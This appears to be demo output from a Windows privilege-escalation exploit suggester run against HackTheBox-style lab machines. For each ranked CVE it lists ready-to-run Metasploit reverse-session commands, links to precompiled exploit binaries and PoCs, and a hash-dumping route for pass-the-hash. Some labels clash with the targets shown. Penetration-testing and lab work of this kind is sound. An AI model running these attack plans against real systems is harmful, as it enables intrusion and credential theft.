# WinIntel v1.0.0 — Live Demo Output

Real output across kernel-exploit boxes (2003 → 2025). **118 CVEs**, scoring engine ranks every
exploit 0–100, and **every delivery method is shown** — Metasploit (MSF), precompiled binaries
(BINARY/SecWiki), ExploitDB (EDB), manual PoCs — so you're never locked into msfconsole.

---

## GRANDPA — Server 2003 SP2 (x86) — KiTrap0D shows MSF + BINARY + EDB

```
WinIntel v1.0.0  --quick mode
  Microsoft(R) Windows(R) Server 2003, Standard Edition  Build 3790  Arch X86  
HFs 0
  CONFIRMED:16  LIKELY:0  (lpe-only · kb-deduped · exploitable only · no noise)

───────────────────────────── ── QUICK ATTACK PLAN ─────────────────────────────

  #1 CONF P1 CVE-2010-0232  Excellent ITW  Kernel Driver
     KiTrap0D — kernel BIOS call via 16-bit app support, local SYSTEM (x86)
     KiTrap0D — most reliable Win7/Vista x86 LPE. Works pre- and post-SP1. First
try this.
     MSF     use exploit/windows/local/ms10_015_kitrap0d
             set SESSION 1; set LHOST tun0; set LPORT 4444; run
     BINARY  Precompiled .exe → SecWiki/MS10-015
             https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10
-015
     EDB     https://www.exploit-db.com/exploits/11199
     Patch: KB977165

  #2 CONF P1 CVE-2014-1767  Great  Kernel Driver
     AFD.sys double-free — local SYSTEM
     AFD.sys double-free — reliable MSF module for x86 targets
     MSF     use exploit/windows/local/ms14_040_afd_bypass
             set SESSION 1; set LHOST tun0; set LPORT 4444; run
     BINARY  Precompiled .exe → SecWiki/MS14-040
             https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14
-040
     Patch: KB2957189

  #3 CONF P1 CVE-2014-4113  Great ITW  Kernel Driver
     Win32k.sys use-after-free (track popup menu) — local SYSTEM, exploited ITW
     Win32k UAF — exploited ITW by APT groups. Reliable MSF module.
     MSF     use exploit/windows/local/ms14_058_track_popup_menu
             set SESSION 1; set LHOST tun0; set LPORT 4444; run
     BINARY  Precompiled .exe → SecWiki/MS14-058
             https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14
-058
     Patch: KB3000061

  #4 CONF P1 CVE-2014-4076  Good  Kernel Driver
     TCP/IP kernel driver LPE — local SYSTEM (Server 2003 only)
     MSF     use exploit/windows/local/ms14_070_tcpip_ioctl
             set SESSION 1; set LHOST tun0; set LPORT 4444; run
     BINARY  Precompiled .exe → SecWiki/MS14-070
             https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14
-070
     Patch: KB2989935

  #5 CONF P1 CVE-2015-1701  Great ITW  Kernel Driver
     Win32k.sys use-after-free (client copy image) — local SYSTEM, exploited ITW
     Win32k UAF — exploited ITW, reliable MSF module for x86
     MSF     use exploit/windows/local/ms15_051_client_copy_image
             set SESSION 1; set LHOST tun0; set LPORT 4444; run
     BINARY  Precompiled .exe → SecWiki/MS15-051
             https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15
-051
     Patch: KB3057191

  #6 CONF P1 CVE-2016-3225  Great  NTLM Relay
     Hot Potato / RottenPotato NTLM relay — local SYSTEM
     Hot Potato / RottenPotato NTLM relay — local SYSTEM via NBNS spoof + NTLM 
relay
     MSF     use exploit/windows/local/ms16_075_reflection_juicy
             set SESSION 1; set LHOST tun0; set LPORT 4444; run
     BINARY  Precompiled .exe → SecWiki/MS16-075
             https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16
-075
     PoC     https://github.com/foxglovesec/RottenPotato
     Patch: KB3164038

  #7 CONF P2 CVE-2008-1084  Good  Kernel Driver
     Win32.sys kernel driver LPE via crafted IOCTL — local SYSTEM
     BINARY  Precompiled .exe → SecWiki/MS08-025
             https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS08
-025
     Patch: KB941693

  #8 CONF P2 CVE-2008-3464  Good  Kernel Driver
     AFD.sys ancillary function driver LPE — local SYSTEM
     BINARY  Precompiled .exe → SecWiki/MS08-066
             https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS08
-066
     EDB     https://www.exploit-db.com/exploits/5704
     Patch: KB956803

────────────────────────────────────────────────────────────────────────────────
  Full output: python winintel.py -i s.txt
  With services: python winintel.py -i s.txt --services smb,rdp,print
```

---

## BASTARD — Server 2008 R2 (x64) — SYSRET, KiTrap0D correctly filtered

```
WinIntel v1.0.0  --quick mode
  Microsoft Windows Server 2008 R2 Datacenter  Build 7600  Arch X64  HFs 0
  CONFIRMED:18  LIKELY:7  (lpe-only · kb-deduped · exploitable only · no noise)

───────────────────────────── ── QUICK ATTACK PLAN ─────────────────────────────

  #1 CONF P1 CVE-2012-0178  Great  Kernel Driver
     SYSRET kernel handler flaw — local SYSTEM (x64 only)
     SYSRET — x64 only. Very reliable on Win7/2008R2 SP1 x64 with MSF module.
     MSF     use exploit/windows/local/ms12_042_sysret
             set SESSION 1; set LHOST tun0; set LPORT 4444; run
     BINARY  Precompiled .exe → SecWiki/MS12-042
             https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS12
-042
     Patch: KB2724197

  #2 CONF P1 CVE-2014-4113  Great ITW  Kernel Driver
     Win32k.sys use-after-free (track popup menu) — local SYSTEM, exploited ITW
     Win32k UAF — exploited ITW by APT groups. Reliable MSF module.
     MSF     use exploit/windows/local/ms14_058_track_popup_menu
             set SESSION 1; set LHOST tun0; set LPORT 4444; run
     BINARY  Precompiled .exe → SecWiki/MS14-058
             https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14
-058
     Patch: KB3000061

  #3 CONF P1 CVE-2016-0099  Excellent  Service LPE
     Secondary Logon service handle LPE — local SYSTEM (PowerShell PoC public)
     MS16-032 Secondary Logon — PowerShell PoC public + MSF module. First try on
Win7/8/10.
     MSF     use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
             set SESSION 1; set LHOST tun0; set LPORT 4444; run
     BINARY  Precompiled .exe → SecWiki/MS16-032
             https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16
-032
     PoC     
https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source
/privesc/Invoke-MS16032.ps1
     Patch: KB3143141

  #4 CONF P1 CVE-2016-3225  Great  NTLM Relay
     Hot Potato / RottenPotato NTLM relay — local SYSTEM
     Hot Potato / RottenPotato NTLM relay — local SYSTEM via NBNS spoof + NTLM 
relay
     MSF     use exploit/windows/local/ms16_075_reflection_juicy
             set SESSION 1; set LHOST tun0; set LPORT 4444; run
     BINARY  Precompiled .exe → SecWiki/MS16-075
             https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16
-075
     PoC     https://github.com/foxglovesec/RottenPotato
     Patch: KB3164038

  #5 CONF P1 CVE-2010-3338  Excellent  Service LPE
     Task Scheduler .job privilege escalation — local SYSTEM
     Task Scheduler schelevator — stable MSF module, works on Win Vista/7
     MSF     use exploit/windows/local/ms10_092_schelevator
             set SESSION 1; set LHOST tun0; set LPORT 4444; run
     BINARY  Precompiled .exe → SecWiki/MS10-092
             https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10
-092
     Patch: KB2305420

  #6 CONF P2 CVE-2009-0079  Good  Service LPE
     Task Scheduler churraskito — local SYSTEM
     BINARY  Precompiled .exe → SecWiki/MS09-012
             https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS09
-012
     Patch: KB959454

  #7 CONF P2 CVE-2010-4398  Good  Kernel Driver
     Kernel stack overflow via RtlQueryRegistryValues — local SYSTEM
     BINARY  Precompiled .exe → SecWiki/MS11-011
             https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS11
-011
     Patch: KB2393802

  #8 CONF P2 CVE-2013-0008  Good  Kernel Driver
     Win32k window station message handling — local SYSTEM
     BINARY  Precompiled .exe → SecWiki/MS13-005
             https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS13
-005
     Patch: KB2778930

────────────────────────────────────────────────────────────────────────────────
  Full output: python winintel.py -i s.txt
  With services: python winintel.py -i s.txt --services smb,rdp,print
```

---

## OPTIMUM — Server 2012 R2 (x64)

```
WinIntel v1.0.0  --quick mode
  Microsoft Windows Server 2012 R2 Standard  Build 9600  Arch X64  HFs 0
  CONFIRMED:14  LIKELY:8  (lpe-only · kb-deduped · exploitable only · no noise)

───────────────────────────── ── QUICK ATTACK PLAN ─────────────────────────────

  #1 CONF P1 CVE-2014-4113  Great ITW  Kernel Driver
     Win32k.sys use-after-free (track popup menu) — local SYSTEM, exploited ITW
     Win32k UAF — exploited ITW by APT groups. Reliable MSF module.
     MSF     use exploit/windows/local/ms14_058_track_popup_menu
             set SESSION 1; set LHOST tun0; set LPORT 4444; run
     BINARY  Precompiled .exe → SecWiki/MS14-058
             https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14
-058
     Patch: KB3000061

  #2 CONF P1 CVE-2016-0099  Excellent  Service LPE
     Secondary Logon service handle LPE — local SYSTEM (PowerShell PoC public)
     MS16-032 Secondary Logon — PowerShell PoC public + MSF module. First try on
Win7/8/10.
     MSF     use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
             set SESSION 1; set LHOST tun0; set LPORT 4444; run
     BINARY  Precompiled .exe → SecWiki/MS16-032
             https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16
-032
     PoC     
https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source
/privesc/Invoke-MS16032.ps1
     Patch: KB3143141

  #3 CONF P1 CVE-2016-3225  Great  NTLM Relay
     Hot Potato / RottenPotato NTLM relay — local SYSTEM
     Hot Potato / RottenPotato NTLM relay — local SYSTEM via NBNS spoof + NTLM 
relay
     MSF     use exploit/windows/local/ms16_075_reflection_juicy
             set SESSION 1; set LHOST tun0; set LPORT 4444; run
     BINARY  Precompiled .exe → SecWiki/MS16-075
             https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16
-075
     PoC     https://github.com/foxglovesec/RottenPotato
     Patch: KB3164038

  #4 CONF P2 CVE-2022-37969  Good  Kernel Driver
     CLFS driver LPE — local SYSTEM, exploited ITW by Nokoyawa and other 
ransomware groups
     BINARY  Precompiled .exe → SecWiki/CVE-2022-37969
             https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-
2022-37969
     Patch: KB5017316

  #5 CONF P2 CVE-2015-0003  Good  Service LPE
     Application compatibility cache LPE — local SYSTEM
     AppCompat cache — rarely has prebuilt binary, may need to compile
     BINARY  Precompiled .exe → SecWiki/MS15-001
             https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15
-001
     Patch: KB3023266

  #6 CONF P2 CVE-2015-0057  Good  Kernel Driver
     Win32k.sys scrollbar use-after-free — local SYSTEM
     Win32k scrollbar UAF — check SecWiki for prebuilt binary
     BINARY  Precompiled .exe → SecWiki/MS15-010
             https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15
-010
     Patch: KB3036220

  #7 CONF P2 CVE-2015-0062  Good  Service LPE
     CreateProcess impersonation token LPE — local SYSTEM
     BINARY  Precompiled .exe → SecWiki/MS15-015
             https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15
-015
     Patch: KB3031432

  #8 CONF P2 CVE-2015-2387  Good  Kernel Driver
     Win32k.sys font parsing — local SYSTEM
     BINARY  Precompiled .exe → SecWiki/MS15-061
             https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15
-061
     Patch: KB3057839

────────────────────────────────────────────────────────────────────────────────
  Full output: python winintel.py -i s.txt
  With services: python winintel.py -i s.txt --services smb,rdp,print
```

---

## DRIVER — Windows 10 2004 (x64) — 2025 CLFS chain top-ranked

```
WinIntel v1.0.0  --quick mode
  Microsoft Windows 10 Enterprise  Build 19041  Arch X64  HFs 8
  CONFIRMED:2  LIKELY:4  (lpe-only · kb-deduped · exploitable only · no noise)

───────────────────────────── ── QUICK ATTACK PLAN ─────────────────────────────

  #1 CONF P2 CVE-2022-24521  Good  Kernel Driver
     CLFS driver LPE — local SYSTEM, exploited ITW by ransomware operators 
(Win10+Win11)
     BINARY  Precompiled .exe → SecWiki/CVE-2022-24521
             https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-
2022-24521
     Patch: KB5012647

  #2 CONF P2 CVE-2022-37969  Good  Kernel Driver
     CLFS driver LPE — local SYSTEM, exploited ITW by Nokoyawa and other 
ransomware groups
     BINARY  Precompiled .exe → SecWiki/CVE-2022-37969
             https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-
2022-37969
     Patch: KB5017316

  #3 LIKE P2 CVE-2021-33739  Good  Kernel Driver
     Microsoft DWM Core Library EoP — local SYSTEM (Win10/Server 20H2)
     BINARY  Precompiled .exe → SecWiki/CVE-2021-33739
             https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-
2021-33739
     Patch: none (build-range)

  #4 LIKE P2 CVE-2021-1732  Good  Kernel Driver
     Win32k EoP — local SYSTEM (Win10 20H2, exploited ITW)
     BINARY  Precompiled .exe → SecWiki/CVE-2021-1732
             https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-
2021-1732
     Patch: none (build-range)

  #5 LIKE P2 CVE-2021-40449  Good ITW  Kernel Driver
     Win32k use-after-free EoP (CallNextHookEx) — local SYSTEM, exploited ITW by
MysterySnail/IronHusky APT (Oct 2021)
     Win32k UAF — ITW by MysterySnail/IronHusky APT (Kaspersky). Works Win7 
through Win10 21H1. SecWiki binary available.
     BINARY  Precompiled .exe → SecWiki/CVE-2021-40449
             https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-
2021-40449
     Patch: none (build-range)

  #6 LIKE P2 CVE-2021-36934  Good  Cred Access
     HiveNightmare/SeriousSam — SAM file read as low-priv user, credential dump
     HiveNightmare — read SAM/SYSTEM as low-priv user. Dump hashes → 
pass-the-hash.
     EDB     https://www.exploit-db.com/exploits/50070
     PoC     https://github.com/GossiTheDog/HiveNightmare
     Patch: none (build-range)

────────────────────────────────────────────────────────────────────────────────
  Full output: python winintel.py -i s.txt
  With services: python winintel.py -i s.txt --services smb,rdp,print
```

---

## SUPPORT — Server 2022 (x64) — modern RansomEXX intel

```
WinIntel v1.0.0  --quick mode
  Microsoft Windows Server 2022 Standard  Build 20348  Arch X64  HFs 6
  CONFIRMED:2  LIKELY:0  (lpe-only · kb-deduped · exploitable only · no noise)

───────────────────────────── ── QUICK ATTACK PLAN ─────────────────────────────

  #1 CONF P2 CVE-2022-24521  Good  Kernel Driver
     CLFS driver LPE — local SYSTEM, exploited ITW by ransomware operators 
(Win10+Win11)
     BINARY  Precompiled .exe → SecWiki/CVE-2022-24521
             https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-
2022-24521
     Patch: KB5012647

  #2 CONF P2 CVE-2022-37969  Good  Kernel Driver
     CLFS driver LPE — local SYSTEM, exploited ITW by Nokoyawa and other 
ransomware groups
     BINARY  Precompiled .exe → SecWiki/CVE-2022-37969
             https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-
2022-37969
     Patch: KB5017316

────────────────────────────────────────────────────────────────────────────────
  Full output: python winintel.py -i s.txt
  With services: python winintel.py -i s.txt --services smb,rdp,print
```

---

